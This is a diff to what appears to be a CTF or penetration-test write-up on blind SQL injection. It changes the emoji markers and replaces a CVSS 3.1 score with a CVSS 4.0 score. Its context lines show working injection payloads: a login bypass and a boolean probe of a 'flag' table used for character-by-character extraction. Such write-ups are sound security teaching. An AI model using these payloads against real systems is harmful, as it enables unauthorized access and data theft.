@@ -36,7 +36,7 @@ First, we confirm SQL injection vulnerability:
 GET /?user='OR'1'='1'OR'a&pass=test HTTP/1.1
 ```
 
-**Response**: `welcome \o/` ✅
+**Response**: `welcome \o/` 
 
 ### Step 2: Identify Database Structure
 Check if a `flag` table exists:
@@ -45,7 +45,7 @@ Check if a `flag` table exists:
 GET /?user='OR(length((select*from(flag)))>0)OR'a&pass=test HTTP/1.1
 ```
 
-**Response**: `welcome \o/` ✅
+**Response**: `welcome \o/` 
 
 
 ### Step 3: Character-by-Character Extraction
@@ -64,9 +64,9 @@ flag{n0_w4f_c4n_st0p_m3}
 ```
 
 
-### CVSS 3.1 Assessment
-- **Base Score**: 9.8 CRITICAL
-- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+### CVSS 4.0 Assessment
+- **Base Score**: 9.3 CRITICAL
+- **Vector**: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L
 
 ## Remediation Recommendations
 
